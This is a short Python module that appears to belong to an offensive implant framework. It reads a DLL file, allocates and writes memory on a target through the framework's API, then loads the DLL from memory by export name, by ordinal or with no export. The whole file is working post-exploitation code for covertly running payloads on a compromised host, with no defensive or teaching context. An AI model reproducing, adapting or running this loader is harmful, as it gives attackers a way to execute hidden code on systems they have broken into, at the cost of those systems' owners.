import eternalhush as eh
from additional.clingyspider import api
from additional.clingyspider import const

def main(args):
    if (args.noexport != 1 and not args.export and args.ordinal == None):
        eh.ui.Echo("You must specify export name or ordinal", eh.ECHO_ERROR)
        return

    if (args.export and args.ordinal and args.noexport != 1):
        eh.ui.Echo("You must specify export name or ordinal", eh.ECHO_ERROR)
        return
    if args.nowait == None:
        args.nowait = 0
    try:
        byte_dll = open(args.dll, "rb").read()
    except Exception:
        eh.ui.Echo("Inavlid dll path", eh.ECHO_ERROR)
        return
    ptr = api.VirtualAlloc(len(byte_dll), const.MEM_COMMIT | const.MEM_RESERVE, const.PAGE_READWRITE)
    if len(byte_dll) == api.WriteMemory(ptr, byte_dll):
        eh.ui.Echo("Dll successfully delivered", eh.ECHO_GOOD)

    if args.noexport:
        api.MemLoadLibraryNoExport(ptr, len(byte_dll), args.nowait)
    elif args.ordinal != None:
        api.MemLoadLibraryOrdinal(ptr, len(byte_dll), args.ordinal, args.nowait)
    elif args.export:
        api.MemLoadLibrary(ptr, len(byte_dll), args.export, args.nowait)



